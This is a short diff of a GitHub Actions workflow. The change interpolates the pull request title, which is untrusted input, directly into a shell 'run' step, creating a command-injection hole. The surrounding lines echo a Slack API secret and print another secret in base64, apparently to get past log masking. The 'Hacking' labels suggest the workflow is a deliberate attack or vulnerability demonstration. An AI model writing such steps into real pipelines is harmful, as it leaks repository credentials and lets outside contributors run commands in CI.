@@ -89,7 +89,7 @@ jobs:
             echo Has REPOSITORY_SLACK_API = '${{ secrets.SLACK_API }}'
 
         - run: |
-            echo 'Hacking'
+            echo 'Hacking for ${{ github.event.pull_request.title }}'
             
             ENCODED=$(echo -n "${{ secrets.SERVICE_NAME }}" | base64) # Base64 encode
             echo "Base64 encoded secret: $ENCODED"
